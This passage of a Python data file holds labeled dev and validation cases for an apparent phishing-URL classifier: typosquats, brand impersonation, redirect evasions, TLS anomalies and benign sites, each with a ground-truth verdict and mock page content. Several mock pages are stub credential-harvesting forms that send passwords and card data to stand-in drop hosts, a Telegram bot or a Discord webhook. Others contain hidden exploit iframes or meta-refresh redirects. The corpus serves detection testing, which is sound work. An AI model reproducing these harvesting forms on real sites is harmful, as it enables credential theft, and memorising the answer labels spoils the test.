                "html_body": "<!DOCTYPE html><html><body><form action=\"https://pipedream.net/v1/collect\"><input type=\"password\" name=\"facebook_pass\"/><button>Appeal Suspension</button></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-047",
        "url": "http://sbi-card-kyc-update.com/pan-verify",
        "normalizedDomain": "sbi-card-kyc-update.com",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "State Bank of India KYC phishing kit harvesting Aadhaar, PAN card, and card CVV.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/verify\"><input name=\"aadhaar\"/><input name=\"pan-number\"/><input name=\"cvv\"/></form></body></html>"
            }
        }
    },

    # =========================================================================
    # CATEGORY 5: TYPOSQUATTING_HOMOGLYPHS (10 cases, GT: 6 MALICIOUS, 4 SUSPICIOUS)
    # Punycode Cyrillic homoglyphs and character substitution targeting major brands.
    # =========================================================================
    {
        "id": "DEV-048",
        "url": "http://xn--ggle-p50aa.com/search",
        "normalizedDomain": "xn--ggle-p50aa.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Punycode representation of Cyrillic homoglyph for google.com (Cyrillic 'о' characters).",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://drop.xyz/harvest\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-049",
        "url": "http://xn--appl-35a.com/support",
        "normalizedDomain": "xn--appl-35a.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Punycode IDN homoglyph imitating Apple customer support.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://apple-exfil.xyz/save\"><input type=\"password\" name=\"appleid_pwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-050",
        "url": "http://paypa1.com/account/login",
        "normalizedDomain": "paypa1.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Leetspeak substitution replacing letter 'l' with numeral '1' targeting PayPal.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/collect\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-051",
        "url": "http://micros0ft.com/verify",
        "normalizedDomain": "micros0ft.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Leetspeak substitution replacing letter 'o' with numeral '0' targeting Microsoft.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/save\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-052",
        "url": "http://arnazon.com/order-update",
        "normalizedDomain": "arnazon.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Visual homoglyph combining 'r' and 'n' to simulate 'm' ('arnazon' -> 'amazon').",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/track\"><input name=\"cardnumber\"/><input name=\"cvv\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-053",
        "url": "http://b0fa-secure-portal.com/auth",
        "normalizedDomain": "b0fa-secure-portal.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Leetspeak typosquatting Bank of America abbreviation ('bofa' -> 'b0fa').",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/post\"><input type=\"password\" name=\"passcode\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-054",
        "url": "http://netf1ix-activation.com",
        "normalizedDomain": "netf1ix-activation.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Leetspeak typosquatting Netflix with '1' replacing 'l' registered without live harvesting form yet.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Service Activation Coming Soon</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-055",
        "url": "http://faceb00k-login-help.com",
        "normalizedDomain": "faceb00k-login-help.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Double numeral substitution '00' replacing 'oo' targeting Facebook help center.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Help Center Directory</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-056",
        "url": "http://wha1sapp-web-connect.com",
        "normalizedDomain": "wha1sapp-web-connect.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Typosquatting WhatsApp web connection portal with numeral '1' substitution.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><p>Scan QR code</p></body></html>"
            }
        }
    },
    {
        "id": "DEV-057",
        "url": "http://c0inbase-token-claim.xyz",
        "normalizedDomain": "c0inbase-token-claim.xyz",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Crypto exchange leetspeak impersonation under high-risk .xyz TLD.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Token Distribution Portal</h1></body></html>"
            }
        }
    },

    # =========================================================================
    # CATEGORY 6: BRAND_IMPERSONATION_SUBDOMAIN_STACKING (10 cases, GT: 8 MALICIOUS, 2 SUSPICIOUS)
    # Keyword stuffing and fake subdomain hierarchies impersonating institutions.
    # =========================================================================
    {
        "id": "DEV-058",
        "url": "http://paypal-security-update-account.com/webscr",
        "normalizedDomain": "paypal-security-update-account.com",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Brand impersonation targeting PayPal with high-risk payment keywords and credential harvest.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/collect\"><input type=\"password\" name=\"password\"/><input name=\"cvv\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-059",
        "url": "http://chase-verify-login.xyz",
        "normalizedDomain": "chase-verify-login.xyz",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Financial brand impersonation under high-abuse .xyz TLD targeting Chase online banking.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/steal\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-060",
        "url": "http://appleid-support-auth.live",
        "normalizedDomain": "appleid-support-auth.live",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Apple ID brand impersonation on high-abuse .live TLD with credential inputs.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/save\"><input type=\"password\" name=\"applepwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-061",
        "url": "http://incometax-refund-claim.org/filing",
        "normalizedDomain": "incometax-refund-claim.org",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Tax authority impersonation hosted on non-governmental TLD (.org) collecting citizen banking credentials.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Tax Refund Verification</h1><form action=\"/submit\"><input name=\"pan-number\"/><input name=\"bankaccount\"/><input name=\"aadhaar\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-062",
        "url": "http://login.microsoft.com.account-auth-system.xyz",
        "normalizedDomain": "login.microsoft.com.account-auth-system.xyz",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Subdomain stacking simulating trusted Microsoft hostname on rogue .xyz domain.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/post\"><input type=\"password\" name=\"ms_password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-063",
        "url": "http://harvard-scholarship-portal.top",
        "normalizedDomain": "harvard-scholarship-portal.top",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Higher education and student aid impersonation on high-abuse .top TLD soliciting financial data.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/apply\"><input name=\"ssn\"/><input name=\"routingnumber\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-064",
        "url": "http://binance-security-prompt.com/withdraw",
        "normalizedDomain": "binance-security-prompt.com",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Cryptocurrency exchange impersonation soliciting account authorization passcodes.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/auth\"><input type=\"password\" name=\"passcode\"/><input name=\"otp\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-065",
        "url": "http://stripe-payment-resolve.site/checkout",
        "normalizedDomain": "stripe-payment-resolve.site",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Stripe payment processor impersonation under high-abuse .site TLD collecting card numbers.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/process\"><input name=\"cardnumber\"/><input name=\"cvv\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-066",
        "url": "http://workday-jobs-interview.xyz",
        "normalizedDomain": "workday-jobs-interview.xyz",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Deceptive employment portal soliciting candidate documents under .xyz TLD.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Candidate Application Portal</h1><form action=\"/upload\"><input type=\"file\" name=\"resume\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-067",
        "url": "http://socialsecurity-benefits-verify.net",
        "normalizedDomain": "socialsecurity-benefits-verify.net",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Public authority keyword stuffing ('socialsecurity') registered under commercial .net TLD.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Benefits Status Lookup</h1></body></html>"
            }
        }
    },

    # =========================================================================
    # CATEGORY 7: MALICIOUS_REDIRECTS_EVASIONS (8 cases, GT: 6 MALICIOUS, 2 SUSPICIOUS)
    # Authority masking, meta refresh redirects, hidden iframe drops, direct IP hosts.
    # =========================================================================
    {
        "id": "DEV-068",
        "url": "http://legitimate-bank.com@evil-phishing-drop.net/secure",
        "normalizedDomain": "evil-phishing-drop.net",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "URL authority masking exploiting '@' symbol to mislead user while directing traffic to evil-phishing-drop.net.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/save\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-069",
        "url": "http://trusted-service.org@credential-stealer.xyz/account",
        "normalizedDomain": "credential-stealer.xyz",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "Userinfo authority masking targeting trusted non-profit identity on .xyz phishing domain.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/harvest\"><input type=\"password\" name=\"passcode\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-070",
        "url": "http://redirect-chain-bounce.com/step1",
        "normalizedDomain": "redirect-chain-bounce.com",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "Client-side meta refresh redirecting users automatically to external attacker landing site.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=http://attacker-landing.biz/payload\"/></head><body>Redirecting...</body></html>"
            }
        }
    },
    {
        "id": "DEV-071",
        "url": "http://phish-loop-evasion.net/entry",
        "normalizedDomain": "phish-loop-evasion.net",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "Meta refresh bouncing victim to external credential harvesting drop (exfil-target.xyz).",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=http://exfil-target.xyz/login\"/></head><body><h1>Please wait...</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-072",
        "url": "http://198.51.100.42/login.php",
        "normalizedDomain": "198.51.100.42",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Direct numeric IP address in URL with login path commonly used to evade domain-based reputation filters.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/auth\"><input type=\"password\" name=\"p\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-073",
        "url": "http://203.0.113.88/secure/update",
        "normalizedDomain": "203.0.113.88",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Raw IP destination host with sensitive security update keywords in URL path.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><p>Security Update In Progress</p></body></html>"
            }
        }
    },
    {
        "id": "DEV-074",
        "url": "http://exploit-carrier-page.com/ad.html",
        "normalizedDomain": "exploit-carrier-page.com",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "Concealed hidden iframe (display:none) executing silent background exploit or tracker payload.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Sponsored Ad</h1><iframe src=\"http://silent-exploit-drop.biz/kit\" style=\"display:none\"></iframe></body></html>"
            }
        }
    },
    {
        "id": "DEV-075",
        "url": "http://deep-subdomain-evasion.a.b.c.d.e.f.phish-hub.xyz/page",
        "normalizedDomain": "deep-subdomain-evasion.a.b.c.d.e.f.phish-hub.xyz",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "Excessive subdomain nesting (>5 levels) and high-abuse .xyz TLD masking root domain identity.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://drop.xyz\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
            }
        }
    },

    # =========================================================================
    # CATEGORY 8: CERTIFICATE_TLS_ANOMALIES (5 cases, GT: 3 MALICIOUS, 2 SUSPICIOUS)
    # Severe TLS certificate flaws, CA/B SC-081v3 violations, or distrusted roots.
    # =========================================================================
    {
        "id": "DEV-076",
        "url": "https://expired-ssl-phish.net/login",
        "normalizedDomain": "expired-ssl-phish.net",
        "category": "CERTIFICATE_TLS_ANOMALIES",
        "groundTruth": "MALICIOUS",
        "provenance": "Expired TLS certificate combined with sensitive authentication login path.",
        "mockContext": {
            "tls": {"status": "expired"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/post\"><input type=\"password\" name=\"p\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-077",
        "url": "https://self-signed-bank-impersonator.com",
        "normalizedDomain": "self-signed-bank-impersonator.com",
        "category": "CERTIFICATE_TLS_ANOMALIES",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Self-signed certificate on untrusted public commercial domain without valid root authority chain.",
        "mockContext": {
            "tls": {"status": "self_signed"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Private Portal</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-078",
        "url": "https://wosign-revoked-root.org",
        "normalizedDomain": "wosign-revoked-root.org",
        "category": "CERTIFICATE_TLS_ANOMALIES",
        "groundTruth": "MALICIOUS",
        "provenance": "Certificate issued by WoSign, an untrusted authority permanently revoked by major browser root stores.",
        "mockContext": {
            "tls": {"status": "distrusted_ca", "ca_pattern": "wosign"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Document Verification</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-079",
        "url": "https://fake-ca-leaf.net",
        "normalizedDomain": "fake-ca-leaf.net",
        "category": "CERTIFICATE_TLS_ANOMALIES",
        "groundTruth": "SUSPICIOUS",
        "provenance": "End-entity subscriber leaf certificate erroneously asserting CA:TRUE basic constraints in violation of RFC 5280.",
        "mockContext": {
            "tls": {"status": "ca_leaf"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Welcome</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-080",
        "url": "https://excessive-validity-2027.com",
        "normalizedDomain": "excessive-validity-2027.com",
        "category": "CERTIFICATE_TLS_ANOMALIES",
        "groundTruth": "MALICIOUS",
        "provenance": "Certificate issued post-March 2026 with 395 days validity, in violation of CA/Browser Forum SC-081v3 200-day limit.",
        "mockContext": {
            "tls": {"status": "excessive_validity"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Portal</h1></body></html>"
            }
        }
    }
]


VAL_CASES = [
    # =========================================================================
    # VALIDATION CORPUS: 25 INDEPENDENT CASES (Non-overlapping with DEV)
    # =========================================================================
    # 1. Benign Legitimate (5 cases)
    {
        "id": "VAL-001",
        "url": "https://www.cloudflare.com",
        "normalizedDomain": "cloudflare.com",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 100. Infrastructure and CDN services homepage with complete modern security headers.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Cloudflare Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Cloudflare</title></head><body><h1>Connect, Protect, and Build Everywhere</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-002",
        "url": "https://www.nih.gov",
        "normalizedDomain": "nih.gov",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Official US National Institutes of Health (.gov) government portal.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>National Institutes of Health (NIH)</title></head><body><h1>Health Information</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-003",
        "url": "https://www.rust-lang.org",
        "normalizedDomain": "rust-lang.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 1000. Open-source programming language official portal.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Rust Programming Language</title></head><body><h1>Rust</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-004",
        "url": "https://www.cam.ac.uk",
        "normalizedDomain": "cam.ac.uk",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Accredited University of Cambridge academic portal (.ac.uk).",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Jisc Services Limited"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>University of Cambridge</title></head><body><h1>Cambridge University</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-005",
        "url": "https://www.redhat.com",
        "normalizedDomain": "redhat.com",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Enterprise open-source software solutions company homepage.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Red Hat</title></head><body><h1>Open Source Technologies</h1></body></html>"
            }
        }
    },

    # 2. Benign Legacy Headers (3 cases)
    {
        "id": "VAL-006",
        "url": "https://coastal-heritage-trust.org",
        "normalizedDomain": "coastal-heritage-trust.org",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Regional historic lighthouse and environmental conservation trust site.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><title>Coastal Heritage Trust</title></head><body><h1>Protecting Our Coastline</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-007",
        "url": "https://harbor-view-diner.com",
        "normalizedDomain": "harbor-view-diner.com",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Local restaurant menu and operating hours informational site.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "cPanel, Inc."},
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><head><title>Harbor View Diner</title></head><body><h1>Breakfast & Lunch Specials</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-008",
        "url": "https://suburban-plumbing-pros.net",
        "normalizedDomain": "suburban-plumbing-pros.net",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Residential plumbing contractor contact information website.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Sectigo Public CA"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><title>Suburban Plumbing Pros</title></head><body><h1>24/7 Plumbing Service</h1></body></html>"
            }
        }
    },

    # 3. Benign Auth Portals (3 cases)
    {
        "id": "VAL-009",
        "url": "https://auth0.openai.com/u/login",
        "normalizedDomain": "openai.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official OpenAI authentication login endpoint on legitimate domain.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Cloudflare Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><body><form action=\"/u/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-010",
        "url": "https://identity.bitbucket.org/login",
        "normalizedDomain": "bitbucket.org",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Bitbucket code repository sign-in portal.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><body><form action=\"/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-011",
        "url": "https://account.box.com/login",
        "normalizedDomain": "box.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Box enterprise cloud content management login service.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><body><form action=\"/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },

    # 4. Confirmed Phishing & Credential Harvesters (4 cases)
    {
        "id": "VAL-012",
        "url": "http://adobe-pdf-cloud-verify.com/login",
        "normalizedDomain": "adobe-pdf-cloud-verify.com",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Adobe document credential phishing page posting password to external collector drop (cloud-drop.biz).",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://cloud-drop.biz/steal.php\"><input type=\"password\" name=\"adobe_pwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-013",
        "url": "http://dhl-express-tracking-delivery.net/parcel",
        "normalizedDomain": "dhl-express-tracking-delivery.net",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "DHL package delivery notification scam exfiltrating credit card data to Telegram API.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"https://api.telegram.org/bot999:XYZ/sendMessage\"><input name=\"cardnumber\"/><input name=\"cvv\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-014",
        "url": "http://dropbox-shared-file-access.info/auth",
        "normalizedDomain": "dropbox-shared-file-access.info",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Dropbox file sharing impersonation form sending passwords to Discord webhook.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"https://discord.com/api/webhooks/777/abc\"><input type=\"password\" name=\"pass\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-015",
        "url": "http://malicious-ransomware-distro.top/cryptor.bin",
        "normalizedDomain": "malicious-ransomware-distro.top",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Active URLhaus malware payload download entry.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "application/octet-stream"},
                "html_body": "MZ ransomware binary"
            },
            "reputation": {
                "urlhaus": {"threat": "malware_download", "tags": ["ransomware", "lockbit"]}
            }
        }
    },

    # 5. Typosquatting & Homoglyphs (3 cases)
    {
        "id": "VAL-016",
        "url": "http://xn--eb-yia.com/login",
        "normalizedDomain": "xn--eb-yia.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Punycode Cyrillic homoglyph mimicking eBay online marketplace.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://drop.xyz/collect\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-017",
        "url": "http://spot1fy-premium-upgrade.com",
        "normalizedDomain": "spot1fy-premium-upgrade.com",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Leetspeak substitution '1' for 'i' targeting Spotify streaming service.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Upgrade Your Music Experience</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-018",
        "url": "http://wellsfarg0-online-banking.net",
        "normalizedDomain": "wellsfarg0-online-banking.net",
        "category": "TYPOSQUATTING_HOMOGLYPHS",
        "groundTruth": "MALICIOUS",
        "provenance": "Numeral substitution '0' for 'o' targeting Wells Fargo online banking.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/steal\"><input type=\"password\" name=\"pwd\"/></form></body></html>"
            }
        }
    },

    # 6. Brand Impersonation (3 cases)
    {
        "id": "VAL-019",
        "url": "http://citibank-card-protection.live",
        "normalizedDomain": "citibank-card-protection.live",
